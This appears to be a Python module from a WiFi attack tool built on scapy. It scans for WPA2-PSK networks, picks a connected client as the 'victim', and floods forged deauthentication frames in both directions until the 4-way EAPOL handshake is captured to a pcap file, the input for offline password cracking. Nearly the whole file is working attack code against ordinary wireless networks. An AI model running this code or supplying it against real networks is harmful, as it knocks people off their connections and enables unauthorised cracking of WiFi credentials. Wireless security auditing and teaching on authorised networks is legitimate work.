import time
import os

from multiprocessing import Process
from colorama import Fore, Style
from datetime import datetime, timedelta
from progress.spinner import PixelSpinner
from utils.helpers import *
from scapy.all import (
    Dot11Beacon,
    Dot11CCMP,
    Dot11EltRSN,
    RSNCipherSuite,
    AKMSuite,
    Dot11,
    Dot11Deauth,
    RadioTap,
    sendp,
    wrpcap,
    AsyncSniffer,
    EAPOL_KEY
)

# Global variables that can't be passed to packet processing functions (prn)
# and needs to be accessed centrally.
SSIDS = {}
PCAP_FILE = ''
HANDSHAKE_COUNTER = 0
HANDSHAKE_TARGET_NUM = 4

# This needs to be accessed by several functions globally
DEBUG = False

def __channel_changer(iface: str) -> None:
    """
    Performs channel hopping every .5 seconds using `iwconfig`.
    """
    ch = 1
    while True:
        os.system(f"/usr/sbin/iwconfig {iface} channel {ch}")
        ch = ch % 14 + 1
        time.sleep(0.5)

def __select_ssid() -> str:
    """
    Shows a formatted list of SSIDS using WPA2 and asks the user to select
    one.
    """
    print('========= WPA2 SSIDS =========\n')
    padding = ' ' + '.' * 50
    for ssid, addr in SSIDS.items():
        print('{:.40s} {}'.format(ssid + padding, addr))

    print()
    ssid = input('Enter SSID (i.e. wifi-home): ')
    print()

    return ssid

def __progress(msg, seconds) -> None:
    """
    Cool progress bar
    """
    end_time = datetime.now() + timedelta(seconds=seconds)
    spinner = PixelSpinner('>>> ' + f'{Fore.RED}' + msg + f'{Style.RESET_ALL}' + ' ')
    while datetime.now() < end_time:
        time.sleep(0.1)
        spinner.next()
    print('\n')

def __find_ssids(pkt) -> None:
    """
    Scans for beacons to get the WPA2 SSIDs
    """
    if pkt.haslayer(Dot11Beacon) and pkt.haslayer(Dot11EltRSN) and pkt.haslayer(AKMSuite):
        cipher = str(pkt[Dot11EltRSN].pairwise_cipher_suites[0].cipher)
        key_type = pkt[AKMSuite].suite
        ssid = pkt.info
        ssid_decode = ssid.decode()
        addr2 = pkt[0].addr2
        addr3 = pkt[0].addr3

        if addr2 != addr3:
            print_err(f'addr2 and addr3 should be the same but found different: {addr2} {addr3}')

        # Make sure to remove SSIDs with empty value and only get frames using
        # CCMP ciphers and frames that has PSK in its AMK suites. Not sure if
        # if there is a better way than this.
        ssid_null_len = len(''.join(ssid_decode.split('\x00')))
        if ssid_null_len != 0 and int(cipher) == 4 and key_type == 2:
            SSIDS[ssid_decode] = addr2

def __filter_deauth(pkt):
    """
    Packet processing function that looks for a 4-way handshake (4 EAPOL
    messages)
    """
    global HANDSHAKE_COUNTER
    global HANDSHAKE_COUNTER

    if pkt.haslayer(EAPOL_KEY) and HANDSHAKE_COUNTER != HANDSHAKE_TARGET_NUM:
        HANDSHAKE_COUNTER += 1
        print_debug(msg='Got EAPOL frame', enabled=DEBUG)
        print_debug(msg=pkt.summary(), enabled=DEBUG)
        wrpcap(PCAP_FILE, pkt, append=True)

def __inject_deauth_pkt(ap_addr: str,
                        sta_addr: str,
                        interface: str) -> bool:
    """
    Performs the actual deauth packet injection to the target STA and AP
    """
    print_info(f"Injecting deauth packets for {ap_addr} and {sta_addr} ...")
 
    t = AsyncSniffer(prn=__filter_deauth, iface=interface)
    t.start()
 
    deauth_pkt1 = RadioTap() / Dot11() / Dot11Deauth()
    deauth_pkt1[Dot11].addr1 = ap_addr
    deauth_pkt1[Dot11].addr2 = sta_addr
    deauth_pkt1[Dot11].addr3 = sta_addr
    deauth_pkt1[Dot11Deauth].reason = 7
 
    deauth_pkt2 = RadioTap() / Dot11() / Dot11Deauth()
    deauth_pkt2[Dot11].addr1 = sta_addr
    deauth_pkt2[Dot11].addr2 = ap_addr
    deauth_pkt2[Dot11].addr3 = ap_addr
    deauth_pkt2[Dot11Deauth].reason = 7
 
    while HANDSHAKE_COUNTER != HANDSHAKE_TARGET_NUM:
        sendp(deauth_pkt1, iface=interface)
        sendp(deauth_pkt2, iface=interface)
        time.sleep(1)
 
    t.stop()
    print_info('Got 4-way handshake, stopped the packet injection and sniffing ...')
    return True

def deauth(ssid: str,
           interface: str,
           async_buffer_time: int,
           pcap_file: str,
           debug: bool) -> bool:
    """
    Main wrapper function for facilitating the deauthentication attack
    """
    global PCAP_FILE
    global DEBUG

    PCAP_FILE = pcap_file
    DEBUG = debug
    handshake_found = False

    # Make sure we remove this before start of attack so previous results will
    # not combine on the current capture.
    try:
        os.remove(pcap_file)
    except FileNotFoundError:
        pass

    addr_sta = ''
    addr_ssid = ''

    sniff_ccmp = AsyncSniffer(stop_filter=lambda x: x.haslayer(Dot11CCMP), iface=interface)
    sniff_ccmp.start()

    # Make sure we have a packet list to work on
    while sniff_ccmp.count == 0 or not sniff_ccmp.results:
        __progress(f'Waiting for AsyncSniffer() to buffer the results', async_buffer_time)

    for pkt in list(sniff_ccmp.results):
        addr1 = pkt[0].addr1
        addr2 = pkt[0].addr2
        addr3 = pkt[0].addr3
        addrs = set([addr1, addr2, addr3])
        addr_ssid = SSIDS[ssid]

        if addr_ssid in addrs and 'ff:ff:ff:ff:ff:ff' not in addrs:
            if len(addrs) != 2:
                print_debug(msg=pkt.show(), enabled=DEBUG)
                print_err(f'Malformed packet. There are 3 mac address found, should only found AP and STA mac address: {addr1} | {addr2} | {addr3}. Retry the attack.')
            else:
                addrs_ssid = {addr_ssid}
                # Tested on 28:6C:07:6F:F9:44
                addr_sta = list(addrs.difference(addrs_ssid))[0]
                print_info(f'Found target STA (victim) addr: {addr_sta}')
                break

    if addr_sta == '':
        print_err('Unable to find a target STA address, try increasing the AsyncSniffer() buffer time (--async-buffer-time).')

    handshake_found = __inject_deauth_pkt(sta_addr=addr_sta,
                                          ap_addr=addr_ssid,
                                          interface=interface)
    return handshake_found

def get_ssid(interface: str,
             scan_time: int) -> str:
    """
    Scans the network for SSIDs and returns the one chosen by the user.
    """
    ssid = ''

    ch = Process(target=__channel_changer, args=[interface,])
    ch.start()

    scan = AsyncSniffer(prn=__find_ssids, iface=interface)
    scan.start()

    __progress('Scanning for APs', scan_time)

    scan.stop()
    ch.terminate()

    ssid = __select_ssid()

    print_info(f'Program will find clients connecting to {ssid} ({SSIDS[ssid]})')

    return ssid
